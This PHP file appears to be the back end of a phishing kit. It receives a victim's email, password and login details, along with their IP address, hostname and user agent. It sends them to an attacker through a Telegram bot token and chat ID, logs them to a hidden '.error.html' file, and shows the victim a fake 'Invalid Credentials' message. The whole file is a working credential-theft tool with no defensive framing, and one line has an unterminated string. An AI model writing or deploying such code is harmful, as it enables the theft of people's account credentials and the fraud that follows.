<?php
$email = trim($_POST['email']);
$password = trim($_POST['password']);
 $detail = trim($_POST['detail']);

 if($email != null && $password != null){
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    
    $message = "|----------| xLs |--------------|\n";
    $message .= "Login From           : ".$detail."\n";
    $message .= "Online ID            : ".$email."\n";
    $message .= "Passcode              : ".$password."\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: ".$ip."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : ".$useragent."\n";
    $message .= "|----------- Sent via Telegram Bot --------------|\n";
    
    // Telegram bot configuration
    $botToken = '8070121337:AAFA2y1bsKPx9xt_cVGghlmm4aAahxxYZ9E'; // Replace with your bot token
    $chatId = '6297605834; // Replace with your chat ID
    
    // Send message via Telegram bot
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ],
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($telegramUrl, false, $context);
    
    // Save to file (optional)
    $data = "\n".$message;
    $fp = fopen('.error.html', 'a');
    fwrite($fp, $data);
    fclose($fp); 

    $signal = 'ok';
    $msg = 'InValid Credentials';
}
else{
    $signal = 'bad';
    $msg = 'Please fill in all the fields.';
}

 $data = array(
    'signal' => $signal,
    'msg' => $msg,
    'redirect_link' => $redirect,
);
echo json_encode($data);
?>